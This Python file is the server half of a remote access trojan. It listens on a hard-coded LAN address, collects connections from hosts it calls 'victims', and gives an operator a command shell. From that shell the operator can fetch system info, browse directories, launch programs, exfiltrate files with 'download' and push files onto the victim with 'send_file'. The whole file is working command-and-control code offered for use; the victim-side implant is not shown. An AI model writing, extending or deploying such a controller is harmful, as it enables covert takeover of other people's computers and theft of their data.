# coding: utf-8
import socket
import threading
import json
from sys import executable, argv
import os

victims = {}
ip_server = "192.168.43.187"
port_server = 1234

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip_server, port_server))
sock.listen(10)


def conn_vict():
    while True:
        try:
            victim, address_victim = sock.accept()
            victims[address_victim] = victim
            print(f"\n@--Connected to {address_victim}--@")
        except:
            continue


def send_command(command):
    try:
        main_victim.send(bytes(command, "utf-8"))
    except ConnectionResetError:
        del_user()
        print("@--User has disconnected--@")
 
        
def del_user():
    for key in victims:
        if main_victim == victims[key]:
            del victims[key]


def set_vict():
    vict_dict = {} 
    if victims:
        i = 0 
        for key in victims:
            i += 1
            vict_dict[i] = (key, victims[key])
            print(f"\n{i}){key} : {victims[key]}")
        client = int(input("Select number of the client: "))

        for number in vict_dict:
            if number == client:
                global main_victim
                main_victim = vict_dict[i][1] 
    else:
        print("@--No user has connected--@")


def get_data():
    while True:
        try:
            data = main_victim.recv(4096)          
            if data.decode("utf-8") == "err":
                return bytes("@--Error--@", "utf-8")
                break
            else:
                return data
                break
        except:
            del_user()
            break


def shell_command():
    while True:
        command = input("###> ")
        array_command = command.split(" ")
        try:
            if command == "set_vict":
                set_vict()

            elif command == "":
                pass

            elif command == "get_info":
                send_command(command)
                data = json.loads(get_data().decode("utf-8"))
                print(data)

            elif array_command[0] == "input":
                send_command(command)               
                print(get_data().decode("utf-8"))

            elif command == "list" or array_command[0] == "cd" or command == "cdir":
                send_command(command)
                print(get_data().decode("utf-8"))

            elif array_command[0] == "start":
                send_command(command)         
                
            elif array_command[0] == "cd_sys":
                os.chdir(array_command[1])
                print(f"Changed directory to {os.getcwd()}")

            elif command == "cdir_sys":
                print(os.getcwd())         
                
            elif array_command[0] == "download":
                send_command(command)
                size = int(get_data().decode("utf-8"))
                file = open(array_command[1], 'wb')
                data = main_victim.recv(size)
                file.write(data)
                file.close()   

            elif array_command[0] == "send_file":
                send_command(command)
                st = round(os.stat(array_command[1]).st_size)
                main_victim.send(bytes(str(st), "utf-8"))
                file = open(array_command[1] , 'rb')
                file_data = file.read(st)
                main_victim.send(file_data)
                file.close()

            else:
                print(f"@--There is no command like '{command}'--@")
        except:
            print("@--User has disconnected--@")
            python = executable
            os.execl(python, python, * argv)

if __name__ == "__main__":
    func_1 = threading.Thread(target=conn_vict)
    func_2 = threading.Thread(target=shell_command)

    func_1.start()
    func_2.start()
